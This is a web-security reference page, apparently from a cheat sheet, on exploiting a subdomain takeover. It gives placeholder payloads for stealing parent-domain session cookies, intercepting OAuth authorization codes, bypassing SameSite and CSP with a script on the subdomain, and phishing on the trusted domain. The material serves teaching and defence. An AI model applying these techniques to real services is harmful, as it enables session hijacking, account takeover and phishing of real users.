# Subdomain Takeover

## Table of Contents

- [Session Hijacking](#session-hijacking)
- [Account Takeover](#account-takeover)
- [Bypass Browser Security Mechanisms](#bypass-browser-security-mechanisms)
- [Phishing with Trusted Domains](#phishing-with-trusted-domains)

## Session Hijacking

### Cookies scoped to the parent domain are sent to the taken-over subdomain, where the attacker's server reads them, including ones marked `HttpOnly`. [^1]

- Collecting session cookies on the subdomain
    ```http
    GET / HTTP/1.1
    Host: abandoned.[VULNERABLE-SERVICE]
    Cookie: session=[VICTIM-SESSION-ID]
    ```
    The victim only needs to open a link to the subdomain. A top-level navigation carries the cookie even under the `SameSite=Lax` default.

## Account Takeover

### Authorization codes or tokens are delivered to the attacker when the identity provider accepts any subdomain as a redirect URI. [^2]

- Receiving an authorization code on the subdomain
    ```text
    https://[IDENTITY-PROVIDER]/oauth/authorize?client_id=[VULNERABLE-SERVICE-CLIENT-ID]&redirect_uri=https://abandoned.[VULNERABLE-SERVICE]/callback&response_type=code&scope=openid%20email
    ```
    A victim who is already signed in to the identity provider is sent to the subdomain with a code issued for the service. The resulting impacts are described in [OAuth Misconfiguration](./OAuth_Misconfiguration.md).

## Bypass Browser Security Mechanisms

### A taken-over subdomain is same-site with the service, so `SameSite` cookie restrictions do not stop CSRF from it.

- Sending a forged request from the subdomain
    - Requests from `abandoned.[VULNERABLE-SERVICE]` to the service are same-site, so cookies set with `SameSite=Lax` or `SameSite=Strict` are attached, and the cases in [CSRF](./CSRF.md) apply.

### Data leakage can occur even with relatively secure CORS configurations.

- HackerOne report, [Subdomain Takeover to Authentication bypass](https://hackerone.com/reports/335330)

### A Content Security Policy that allows the service's subdomains is satisfied by a script hosted on the taken-over subdomain.

- Loading a script that the policy allows
    1. Policy of the service
        ```http
        Content-Security-Policy: script-src 'self' *.[VULNERABLE-SERVICE]
        ```

    2. Markup injected into the service
        ```html
        <script src="https://abandoned.[VULNERABLE-SERVICE]/x.js"></script>
        ```
    Combined with an [HTML Injection](./HTML_Injection.md), the script runs even though the policy blocks inline scripts.

## Phishing with Trusted Domains

### Phishing can be effectively carried out through trusted domain.

- Hosting a sign-in page on the subdomain
    ```text
    https://abandoned.[VULNERABLE-SERVICE]/login
    ```
    The address bar shows the service's own domain, and the hosting provider that the subdomain points to usually issues a valid certificate for it, so the usual signs of phishing are absent.

[^1]: Applies when the session cookie is set with the `Domain` attribute.
[^2]: Applies when the identity provider validates `redirect_uri` by domain, accepting any subdomain of the service.
